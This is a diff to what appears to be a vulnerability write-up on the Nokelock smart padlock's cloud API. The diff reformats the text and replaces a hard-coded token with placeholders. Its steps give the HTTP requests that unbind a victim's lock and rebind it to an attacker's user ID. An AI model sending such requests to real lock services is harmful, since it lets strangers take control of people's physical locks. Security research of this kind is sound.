@@ -90,7 +90,7 @@ We intercept the different requests being sent from the app which we will later 
 
 ### Step 2
 
-*And now that we have all necessary information, we shall proceed to unbind the lock from the victim’s device using the victim’s USER ID.
+* And now that we have all necessary information, we shall proceed to unbind the lock from the victim’s device using the victim’s  USER ID.
       
       POST /oklock/lock/unbind HTTP/1.1
       User-Agent: nokelockTool/1.4.8(<DEVICE INFO>)
@@ -108,21 +108,21 @@ We intercept the different requests being sent from the app which we will later 
 
 ### Step 3
 
-*And now we proceed to bind it to the attacker’s device using the following command.
+* And now we proceed to bind it to the attacker’s device using the following command.
 
-    POST /oklock/lock/bind HTTP/1.1
-    User-Agent: nokelockTool/1.4.8(Android 5.0.2 ; LENOVO/Lenovo A6010)
-    clientType: Android 
-    token: 56dce1fc3f4f49d98c74246e1b5a7ce9
-    language: US
-    appVersion: 1.4.8
-    Content-Type: application/json;charset=UTF-8
-    Content-Length: 56
-    Host: api.oklock.com.cn
-    Connection: close
-    Accept-Encoding: gzip, deflate
+      POST /oklock/lock/bind HTTP/1.1
+      User-Agent: nokelockTool/1.4.8(<DEVICE INFO>)
+      clientType: Android 
+      token: <TOKEN>
+      language: US
+      appVersion: 1.4.8
+      Content-Type: application/json;charset=UTF-8
+      Content-Length: 56
+      Host: api.oklock.com.cn
+      Connection: close
+      Accept-Encoding: gzip, deflate
 
-    {"name":"<LOCK NAME>","userId":<ATTACKER USERID>,"mac":"<LOCK MACID>"}
+      {"name":"<LOCK NAME>","userId":<ATTACKER USERID>,"mac":"<LOCK MACID>"}
 
 
 
